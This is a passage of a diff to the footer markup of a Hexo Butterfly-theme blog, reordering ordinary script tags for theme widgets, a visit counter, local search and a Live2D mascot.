-});</script></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2016 - 2020 By Sp4ce</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
- <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
-POWERMODE.shake = true;
-document.body.addEventListener('input', POWERMODE);
-</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script src="/js/third-party/ClickShowText.js"></script><script src="/js/search/local-search.js"></script><script>var endLoading = function () {
+document.addEventListener('DOMContentLoaded', panguFn)</script><script src="/js/search/local-search.js"></script><script>var endLoading = function () {
   document.body.style.overflow = 'auto';
   document.getElementById('loading-box').classList.add("loaded")
 }
-window.addEventListener('load',endLoading)</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"display":{"position":"right","width":300,"height":600,"vOffset":-50},"mobile":{"show":false},"dialog":{"enable":false,"hitokoto":false},"react":{"opacity":0.7},"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"log":false});</script></body></html>
+window.addEventListener('load',endLoading)</script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script src="/js/third-party/activate-power-mode.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="/js/third-party/click_heart.js" async="async"></script><script src="/js/third-party/ClickShowText.js" async="async"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"display":{"position":"right","width":300,"height":600,"vOffset":-50},"mobile":{"show":false},"dialog":{"enable":false,"hitokoto":false},"react":{"opacity":0.7},"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"log":false});</script></body></html>
